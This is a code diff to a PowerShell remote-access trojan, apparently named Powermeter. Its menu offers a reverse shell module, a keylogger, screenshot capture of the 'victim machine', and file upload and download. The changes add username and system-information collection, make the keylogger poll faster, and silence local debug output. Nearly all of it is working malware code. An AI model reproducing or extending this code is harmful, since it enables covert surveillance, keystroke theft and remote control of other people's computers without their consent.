@@ -187,8 +187,8 @@ function readCmdFromStream($stream) {
 	return $data				
 }
 
-function writeConsoleTagToStream($consoleTag) {
-	$msgByte = $encoding.GetBytes($consoleTag);
+function writeConsoleTagToStream($params) {
+	$msgByte = $encoding.GetBytes($params[1]);
 	$params[0].Write($msgByte,0,$msgByte.Length);
 	$params[0].Flush();
 }
@@ -222,6 +222,9 @@ $ReverseShellThread =  {
 	$encoding=(New-Object -TypeName System.Text.ASCIIEncoding)
 	[byte[]]$bytes = 0..65535|%{0};
 	
+	$params=$stream,'', ('PS ' + (pwd).Path + '> ')
+	writeToStream($params);
+
 	while( $true )
 	{
 		while( $stream.DataAvailable )
@@ -330,7 +333,7 @@ $KeyLoggerThread = {
   	 	{
 
     			while ($true) {
-      				Start-Sleep -Milliseconds 40
+      				Start-Sleep -Milliseconds 10
       
       				# scan all ASCII codes above 8
       				for ($ascii = 9; $ascii -le 254; $ascii++) {
@@ -440,38 +443,36 @@ $PortNumPattern = @"
 	$stream.Flush();
 	$rState=1;
 
-
 	while($rState)
 	{
 		while( $stream.DataAvailable )
 		{
-
 			$cmd = readCmdFromStream($stream)
-			write-host $cmd
+			#write-host $cmd
 
 			if($cmd -eq "rshell") {
 				$module=($console+"reverse_shell>");	
-				writeConsoleTagToStream($module);
+				writeConsoleTagToStream($stream,$module);
 
 				while($true) {
 
 					[string]$data = readCmdFromStream($stream);
 					#$dataArr = $data -split ' '	
-					write-host $data
+					#write-host $data
 	
 					if($data -eq "run") {
 						if($LHOST -and $LPORT) {
 							$success=1;
-							writeConsoleTagToStream($module);
+							writeConsoleTagToStream($stream,$module);
 							break;
 						}
 						else {
 							$success=0;
-							writeConsoleTagToStream("`r`n" + "`r`n"  + "Parameters" + "`r`n" + "=============" + "`r`n" + "`r`n");
-							writeConsoleTagToStream("`t Name".PadRight(25,' ') + "`t`t`t Value" + "`r`n")
-							writeConsoleTagToStream("`t -------".PadRight(25,' ') + "`t`t`t -----------" + "`r`n")
-							writeConsoleTagToStream("`t LHOST".PadRight(25,' ') + "`t`t`t" + $LHOST + "`r`n")
-							writeConsoleTagToStream("`t LPORT".PadRight(25,' ') + "`t`t`t" + $LPORT + "`r`n")
+							writeConsoleTagToStream($stream,("`r`n" + "`r`n"  + "Parameters" + "`r`n" + "=============" + "`r`n" + "`r`n"));
+							writeConsoleTagToStream($stream,("`t Name".PadRight(25,' ') + "`t`t`t Value" + "`r`n"))
+							writeConsoleTagToStream($stream,("`t -------".PadRight(25,' ') + "`t`t`t -----------" + "`r`n"))
+							writeConsoleTagToStream($stream,("`t LHOST".PadRight(25,' ') + "`t`t`t" + $LHOST + "`r`n"))
+							writeConsoleTagToStream($stream,("`t LPORT".PadRight(25,' ') + "`t`t`t" + $LPORT + "`r`n"))
 							$failMsg="[+] Failed to start reverse shell module. All parameters must be set.."
 							$params=$stream,$failMsg,$module
 							writeToStream($params);
@@ -479,7 +480,7 @@ $PortNumPattern = @"
 					}
 					elseif($data -eq "back") {
 						$success=0;
-						writeConsoleTagToStream($console);	
+						writeConsoleTagToStream($stream,$console);	
 						break;
 					}
 						
@@ -490,11 +491,11 @@ $PortNumPattern = @"
 							$params=$stream,"[+]LHOST is set",$module
 							writeToStream($params);
 						} else {
-							write-host "[+]Wrong ipv4 format!"
+							#write-host "[+]Wrong ipv4 format!"
 							$params=$stream,"[+]Wrong ipv4 format!",$module
 							writeToStream($params);
 						}						
-						write-host $LHOST
+						#write-host $LHOST
 					}
 						
 					elseif(($posLPORT = $data.IndexOf("set LPORT=")) -eq 0) {
@@ -507,28 +508,28 @@ $PortNumPattern = @"
 							writeToStream($params);
 	
 						} else {
-							write-host "[+]Wrong Port number format!"
+							#write-host "[+]Wrong Port number format!"
 							$params=$stream,"[+]Wrong Port number format!",$module
 							writeToStream($params);
 						}							
-						write-host $LPORT
+						#write-host $LPORT
 					}
 
 					elseif($data -eq "show options") {
-						write-host "opsiyonlaaaaar"
-						Write-Options -ModuleNumber 1
+						#write-host "opsiyonlaaaaar"
+						Get-Options -ModuleNumber 1
 
 					}
 					else {	
 						$params=$stream,"[+]Wrong command!",$module
 						writeToStream($params);
-						write-host "wrong command!"
+						#write-host "wrong command!"
+						Get-Options -ModuleNumber 1
 					}
 				}
 					
 				if($success) {
 					$job = Start-Job -Name "ReverseShellJob" -ScriptBlock $ReverseShellThread -ArgumentList $LHOST,$LPORT
-					write-host "aa"
 					$params=$stream,'[+]TCP reverse shell',$console
 					writeToStream($params);	
 				}	
@@ -536,7 +537,6 @@ $PortNumPattern = @"
 					if($LHOST) {Remove-Variable LHOST;}
 					if($LPORT) {Remove-Variable LPORT;}						
 			}
-
 
 			elseif($cmd -eq "start keylogger") {
     				$logFile="$env:temp\keylogger.txt"
@@ -548,7 +548,7 @@ $PortNumPattern = @"
 			elseif($cmd -eq "show jobs") {
 				$activeJobs="Active jobs:"
 				$activeJobs+=get-job | fl | out-string
-				write-host $activeJobs						
+				#write-host $activeJobs						
 				$msg = '[+]' + $activeJobs;
 				$params=$stream,$msg,$console
 				writeToStream($params);	
@@ -643,7 +643,7 @@ $PortNumPattern = @"
 
 			#### stop methods..			
 			elseif($cmd -eq "exit") {				
-				write-host "exitting.."
+				#write-host "exitting.."
 				$params=$stream,'[+]Exitting.. Bye!',$console
 				writeToStream($params);
 				$rState=0;
@@ -674,7 +674,7 @@ $PortNumPattern = @"
 					writeToStream($params);
 					$job = Start-Job -Name "SendFileJob" -ScriptBlock $SendFileThread -ArgumentList $SHOST,$FLPORT,$file,$false
 				} else {
-					write-host "[+]Wrong path or file!"
+					#write-host "[+]Wrong path or file!"
 					$params=$stream,"[+]Wrong path or file!",$console
 					writeToStream($params);
 				}						
@@ -695,22 +695,31 @@ $PortNumPattern = @"
 					$params=$stream,"[+]FLPORT is set",$console
 					writeToStream($params);
 				} else {
-					write-host "[+]Wrong Port number format!"
+					#write-host "[+]Wrong Port number format!"
 					$params=$stream,"[+]Wrong Port number format!",$console
 					writeToStream($params);
 				}
-						
-				write-host $FLPORT
+				#write-host $FLPORT
 			}
+		
+			elseif($cmd -eq "get username") {
+				$params=$stream,$env:UserName,$console
+				writeToStream($params);
+			}
+	
 			elseif($cmd -eq "show options") {
-				Write-Options -ModuleNumber 0
+				Get-Options -ModuleNumber 0
+			}
+			
+			elseif($cmd -eq "get sysinfo") {
+				Get-Sysinfo
 			}
  						
 			else {
-				write-host "bu ne?";
+				#write-host "[+]Command is not known..";
 				$params=$stream,'[+]Command is not known..',$console
 				writeToStream($params);
-				Write-Options -ModuleNumber 0
+				Get-Options -ModuleNumber 0
 			}
 		}
 		sleep 0.75;
@@ -719,7 +728,31 @@ $PortNumPattern = @"
 } #
 
 
-function Write-Options {
+function Get-Sysinfo {
+	writeConsoleTagToStream($stream,("`r`n" + "`r`n"  + "System Info" + "`r`n" + "=============" + "`r`n" + "`r`n"));
+	writeConsoleTagToStream($stream,("`t Name".PadRight(25,' ') + "`t`tValue" + "`r`n"))
+	writeConsoleTagToStream($stream,("`t -------".PadRight(25,' ') + "`t`t--------" + "`r`n"))
+	$tmpInfo=Get-WmiObject Win32_OperatingSystem | Select-Object  Caption | ForEach{ $_.Caption } | Out-String
+	writeConsoleTagToStream($stream,("`t OS Version:".PadRight(25,' ') + "`t`t" + $tmpInfo))
+	$tmpInfo=Get-WmiObject Win32_OperatingSystem | Select-Object  InstallDate | ForEach{ $_.InstallDate} | Out-String
+	writeConsoleTagToStream($stream,("`t Install Date:".PadRight(25,' ') + "`t`t" + $tmpInfo))
+	$tmpInfo=Get-WmiObject Win32_OperatingSystem | Select-Object  ServicePackMajorVersion | ForEach{ $_.ServicePackMajorVersion} | Out-String
+	writeConsoleTagToStream($stream,("`t Service Pack Version:".PadRight(35,' ') + "`t`t" + $tmpInfo))
+	$tmpInfo=Get-WmiObject Win32_OperatingSystem | Select-Object  OSArchitecture | ForEach{ $_.OSArchitecture} | Out-String
+	writeConsoleTagToStream($stream,("`t OS Architecture:".PadRight(25,' ') + "`t`t" + $tmpInfo))
+	$tmpInfo=Get-WmiObject Win32_OperatingSystem | Select-Object  BootDevice | ForEach{ $_.BootDevice} | Out-String
+	writeConsoleTagToStream($stream,("`t Boot Device:".PadRight(25,' ') + "`t`t" + $tmpInfo))
+	$tmpInfo=Get-WmiObject Win32_OperatingSystem | Select-Object  BuildNumber | ForEach{ $_.BuildNumber} | Out-String
+	writeConsoleTagToStream($stream,("`t Build Number:".PadRight(25,' ') + "`t`t" + $tmpInfo))
+	$tmpInfo=Get-WmiObject Win32_OperatingSystem | Select-Object  CSName | ForEach{ $_.CSName} | Out-String
+	writeConsoleTagToStream($stream,("`t Host Name:".PadRight(25,' ') + "`t`t" + $tmpInfo))
+	$tmpInfo=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Internet Explorer').Version | Out-String
+	writeConsoleTagToStream($stream,("`t Internet Explorer Version:".PadRight(25,' ') + "`t`t" + $tmpInfo))
+	writeConsoleTagToStream($stream,("`r`n" +"Powershell>")) 
+}
+
+
+function Get-Options {
 
 	Param ( 
        	    	[Parameter( 
@@ -730,35 +763,37 @@ function Write-Options {
 	)
 
 	if($ModuleNumber -eq 0) {
-		writeConsoleTagToStream("`r`n" + "`r`n"  + "Options" + "`r`n" + "=============" + "`r`n" + "`r`n");
-		writeConsoleTagToStream("`t Command".PadRight(25,' ') + "`t`t`t Description" + "`r`n")
-		writeConsoleTagToStream("`t -------".PadRight(25,' ') + "`t`t`t -----------" + "`r`n")
-		writeConsoleTagToStream("`t set FLPORT=<port>".PadRight(25,' ') + "`t`t`t Set file transfer port" + "`r`n")
-		writeConsoleTagToStream("`t rshell".PadRight(25,' ') + "`t`t`t Open reverse shell module" + "`r`n")
-		writeConsoleTagToStream("`t start keylogger".PadRight(25,' ') + "`t`t`t Start keylogger thread" + "`r`n")
-		writeConsoleTagToStream("`t show jobs".PadRight(25,' ') + "`t`t`t Show all active threads" + "`r`n")
-		writeConsoleTagToStream("`t stop job -keylogger".PadRight(25,' ') + "`t`t`t Stop keylogger thread and download captured keystrokes from file port" + "`r`n")	
-		writeConsoleTagToStream("`t stop job -reverseShell".PadRight(25,' ') + "`t`t`t Stop reverse shell session and thread" + "`r`n")
-		writeConsoleTagToStream("`t stop job -sendFile".PadRight(25,' ') + "`t`t`t Stop file downloading thread" + "`r`n")
-		writeConsoleTagToStream("`t stop job -receiveFile".PadRight(25,' ') + "`t`t`t Stop file uploading thread" + "`r`n")
-		writeConsoleTagToStream("`t stop job -all".PadRight(25,' ') + "`t`t`t Stop all active threads" + "`r`n")
-		writeConsoleTagToStream("`t screencap -screen".PadRight(25,' ') + "`t`t`t Capture screenshot of victim machine [WHOLE SCREEN] and download it" + "`r`n")
-		writeConsoleTagToStream("`t screencap -activeWindow".PadRight(25,' ') + "`t`t`t Capture screenshot of victim machine [ACTIVE WINDOW] and download it" + "`r`n")
-		writeConsoleTagToStream("`t download <fileFromVictim>".PadRight(25,' ') + "`t`t`t Download a file from victim machine.[<fileFromVictim>: An absolute file path in victim machine that the attacker downloads]" + "`r`n")
-		writeConsoleTagToStream("`t upload <fileToVictim>".PadRight(25,' ') + "`t`t`t Upload a file to victim machine.[<fileToVictim>: An absolute file path in victim machine to store file uploaded by attacker]" + "`r`n")	
-		writeConsoleTagToStream("`t exit".PadRight(25,' ') + "`t`t`t Exit the program" + "`r`n")
-		writeConsoleTagToStream("`t Important: File transfer port should be opened in attacker's side to achieve download,uploading files." + "`r`n" + "`r`n") 
-		writeConsoleTagToStream("Powershell>") 
+		writeConsoleTagToStream($stream,("`r`n" + "`r`n"  + "Options" + "`r`n" + "=============" + "`r`n" + "`r`n"));
+		writeConsoleTagToStream($stream,("`t Command".PadRight(25,' ') + "`t`t`t Description" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t -------".PadRight(25,' ') + "`t`t`t -----------" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t get sysinfo".PadRight(25,' ') + "`t`t`t Get system information about victim machine" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t get username".PadRight(25,' ') + "`t`t`t Get username of victim machine" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t set FLPORT=<port>".PadRight(25,' ') + "`t`t`t Set file transfer port" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t rshell".PadRight(25,' ') + "`t`t`t Open reverse shell module" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t start keylogger".PadRight(25,' ') + "`t`t`t Start keylogger thread" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t show jobs".PadRight(25,' ') + "`t`t`t Show all active threads" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t stop job -keylogger".PadRight(25,' ') + "`t`t`t Stop keylogger thread and download captured keystrokes from file port" + "`r`n"))	
+		writeConsoleTagToStream($stream,("`t stop job -reverseShell".PadRight(25,' ') + "`t`t`t Stop reverse shell session and thread" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t stop job -sendFile".PadRight(25,' ') + "`t`t`t Stop file downloading thread" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t stop job -receiveFile".PadRight(25,' ') + "`t`t`t Stop file uploading thread" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t stop job -all".PadRight(25,' ') + "`t`t`t Stop all active threads" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t screencap -screen".PadRight(25,' ') + "`t`t`t Capture screenshot of victim machine [WHOLE SCREEN] and download it" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t screencap -activeWindow".PadRight(25,' ') + "`t`t`t Capture screenshot of victim machine [ACTIVE WINDOW] and download it" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t download <fileFromVictim>".PadRight(25,' ') + "`t`t`t Download a file from victim machine.[<fileFromVictim>: An absolute file path in victim machine that the attacker downloads]" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t upload <fileToVictim>".PadRight(25,' ') + "`t`t`t Upload a file to victim machine.[<fileToVictim>: An absolute file path in victim machine to store file uploaded by attacker]" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t exit".PadRight(25,' ') + "`t`t`t Exit the program" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t Important: File transfer port should be opened in attacker's side to achieve download,uploading files." + "`r`n" + "`r`n"))
+		writeConsoleTagToStream($stream,("Powershell>")) 
 	}
 	elseif($ModuleNumber -eq 1) {
-		writeConsoleTagToStream("`r`n" + "`r`n"  + "Options" + "`r`n" + "=============" + "`r`n" + "`r`n");
-		writeConsoleTagToStream("`t Command".PadRight(25,' ') + "`t`t`t Description" + "`r`n")
-		writeConsoleTagToStream("`t -------".PadRight(25,' ') + "`t`t`t -----------" + "`r`n")
-		writeConsoleTagToStream("`t set LHOST=<IPv4>".PadRight(25,' ') + "`t`t`t Set local IP address" + "`r`n")
-		writeConsoleTagToStream("`t set LPORT=<port>".PadRight(25,' ') + "`t`t`t Set local port address" + "`r`n")
-		writeConsoleTagToStream("`t run".PadRight(25,' ') + "`t`t`t Start reverse shell" + "`r`n")
-		writeConsoleTagToStream("`t back".PadRight(25,' ') + "`t`t`t Exit from reverse shell module" + "`r`n")
-		writeConsoleTagToStream("Powershell>reverse_shell>") 
+		writeConsoleTagToStream($stream,("`r`n" + "`r`n"  + "Options" + "`r`n" + "=============" + "`r`n" + "`r`n"));
+		writeConsoleTagToStream($stream,("`t Command".PadRight(25,' ') + "`t`t`t Description" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t -------".PadRight(25,' ') + "`t`t`t -----------" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t set LHOST=<IPv4>".PadRight(25,' ') + "`t`t`t Set local IP address" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t set LPORT=<port>".PadRight(25,' ') + "`t`t`t Set local port address" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t run".PadRight(25,' ') + "`t`t`t Start reverse shell" + "`r`n"))
+		writeConsoleTagToStream($stream,("`t back".PadRight(25,' ') + "`t`t`t Exit from reverse shell module" + "`r`n"))
+		writeConsoleTagToStream($stream,("Powershell>reverse_shell>")) 
 	}
 }
 #Powermeter>upload C:\Users\decoder\Desktop\getrekt.txt
